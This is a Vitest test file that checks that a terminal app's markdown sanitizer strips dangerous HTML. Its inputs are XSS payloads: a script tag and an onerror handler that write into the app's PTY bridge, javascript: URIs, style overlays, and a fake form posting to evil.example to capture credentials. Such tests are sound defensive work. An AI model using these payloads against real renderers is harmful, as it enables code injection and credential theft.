// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { renderMarkdown } from '../../src/renderer/components/Markdown/markdown-utils';

/**
 * The markdown sanitizer is a security boundary, and until 1.12.1 it had no
 * test at all.
 *
 * Markdown reaches a surface from CLI/pipe callers (`wmux markdown set`), from
 * agents, and from files on disk. None of that is trusted, `marked` emits raw
 * HTML by design, and the result goes through `dangerouslySetInnerHTML` into
 * the renderer that holds the preload bridge — so a surviving script inherits
 * `window.wmux` and with it the ability to write into any pane's PTY.
 *
 * These tests exist because the enforcement is a third-party library we bump
 * whenever an advisory lands (dompurify 3.4.11 -> 3.4.14 for GHSA-c2j3-45gr-mqc4
 * and GHSA-55q2-fjhq-7xh7, issue #199). A sanitizer upgrade that silently
 * changed policy would otherwise be invisible until someone exploited it.
 */

describe('renderMarkdown strips what a renderer with IPC access must never run', () => {
  it('drops a script tag', () => {
    const html = renderMarkdown('Hello\n\n<script>window.wmux.pty.write("x")</script>');
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toContain('window.wmux');
    expect(html).toContain('Hello');
  });

  it('drops inline event handlers', () => {
    const html = renderMarkdown('<img src="x" onerror="window.wmux.pty.write(1)">');
    expect(html).not.toMatch(/onerror/i);
    expect(html).not.toContain('window.wmux');
  });

  it('drops javascript: URIs while keeping ordinary links', () => {
    const evil = renderMarkdown('[click](javascript:alert(1))');
    expect(evil).not.toMatch(/javascript:/i);

    const good = renderMarkdown('[docs](https://wmux.org/)');
    expect(good).toContain('https://wmux.org/');
  });

  it('drops the tags the pane forbids outright', () => {
    // `style` can restyle the app around the pane; the form controls can put a
    // convincing credential prompt inside what looks like a document.
    const html = renderMarkdown(
      '<style>body{display:none}</style>' +
      '<form action="https://evil.example"><input name="p"><button>Go</button></form>' +
      '<textarea></textarea><select></select>',
    );
    for (const tag of ['style', 'form', 'input', 'button', 'textarea', 'select']) {
      expect(html).not.toMatch(new RegExp(`<${tag}[\\s>]`, 'i'));
    }
  });

  it('drops style attributes', () => {
    const html = renderMarkdown('<p style="position:fixed;inset:0">covered</p>');
    expect(html).not.toMatch(/style\s*=/i);
    expect(html).toContain('covered');
  });

  it('does not execute an iframe or object payload', () => {
    const html = renderMarkdown('<iframe src="javascript:alert(1)"></iframe><object data="x"></object>');
    expect(html).not.toMatch(/javascript:/i);
  });
});

describe('renderMarkdown still renders ordinary markdown', () => {
  it('keeps headings, emphasis, code and lists', () => {
    const html = renderMarkdown('# Title\n\nSome **bold** and `code`.\n\n- one\n- two\n');
    expect(html).toMatch(/<h1[^>]*>Title<\/h1>/);
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<code>code</code>');
    expect(html).toContain('<li>one</li>');
  });

  it('honours the gfm + breaks options the pane was built with', () => {
    // `breaks: true` is why a single newline is a <br> rather than a space —
    // agents write markdown that relies on it.
    expect(renderMarkdown('line one\nline two')).toContain('<br>');
    // gfm tables.
    const table = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(table).toContain('<table>');
  });

  it('returns an empty string for empty content rather than throwing', () => {
    expect(renderMarkdown('')).toBe('');
  });

  it('renders GFM task lists as glyphs, never as an <input>', () => {
    // This renderer override and the FORBID_TAGS list are one decision: task
    // lists are drawn as ☐/☑ precisely BECAUSE `input` is forbidden. Without
    // the override the sanitizer strips the checkbox and the item renders as a
    // bare bullet. Pinned because the two now live together and a future edit
    // could plausibly move or drop one of them.
    const html = renderMarkdown('- [ ] todo\n- [x] done\n');
    expect(html).not.toMatch(/<input/i);
    expect(html).toContain('☐');
    expect(html).toContain('☑');
    expect(html).toContain('markdown-pane__task--done');
  });
});
